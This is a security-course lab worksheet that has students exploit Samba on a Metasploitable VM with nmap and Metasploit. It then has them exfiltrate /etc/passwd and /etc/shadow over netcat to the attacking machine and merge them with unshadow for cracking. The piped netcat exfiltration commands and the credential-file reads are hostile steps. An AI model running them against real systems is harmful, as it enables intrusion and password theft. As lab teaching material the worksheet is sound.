# Lab 7 - Exploiting Samba and Exfiltrating Data 

Samba is a free software implementation of the SMB networking protocol. It provides file and print services for various systems. It runs on most Unix-like systems such as Linux, Solaris, AIX etc. 

In this Lab, you will be exploiting the Samba implementation on Metasploitable as well as use netcat to exfiltrate data.

Ensure that both the Kali and the metasploitable machines are powered on and on the same network. Verify connectivity between them by using the ping command.

1. Run nmap against the metasploitable machine using the following command.

	`sudo nmap -sV <metasploitable IP> -vvv` (make a note of open ports and services).

make a note of what port Samba is running.

2. On your Kali machine launch the metasploit framework.

3. Search for Samba exploits based on version identified in nmap results.

	`msf6> search type:exploit name:samba`

4. Select the exploit matching the version (note that the search option may not provide a lot of information so you will likely have to try multiple exploits to make it work).

5. Select the exploit by using command below.

	`use exploit/xxxxx`

6. Set required options by using set command (hint RHOSTS, and possibly payload).

7. Execute the exploit (this should open a session on the exploited host).

8. Open another Kali terminal window.

9. Launch netcat in a listen mode and redirect output to a file as shown.

	`nc -l -p 4567 > passwd.txt`

10. From the exploited system terminal (session opened from metasploit exploit you executed) type the following commands to extract the `/etc/passwd` file.

	`cat /etc/passwd | nc <kali ip> 4567` (there will be no progress bar and there should be no error messages).

go back to the listening netcat window and terminate it using CTRL+C. Cat the contents of the `passwd.txt` file using command below.

	`cat passwd.txt` 

11. Start another `netcat` command but redirect the contents to `shadow.txt` instead of `passwd.txt` (use the same command as in Step 9 just change `passwd.txt` to `shadow.txt`).

12. From the exploited system terminal (session opened from metasploit exploit you executed) type the following commands to extract the `/etc/shadow file`.

	`cat /etc/shadow| nc <kali ip> 4567` (there will be no progress bar and there should be no error messages).

go back to the listening netcat window and terminate it using CTRL+C. Cat the contents of the `passwd.txt` file using command below.

	`cat shadow.txt`

13. On your kali box combine the contents of `passwd.txt` and `shadow.txt` using the command below.

	`unshadow passwd.txt shadow.txt > user_logins.txt` 

14. What is the content of the combined `user_logins.txt` file (include screen shot).
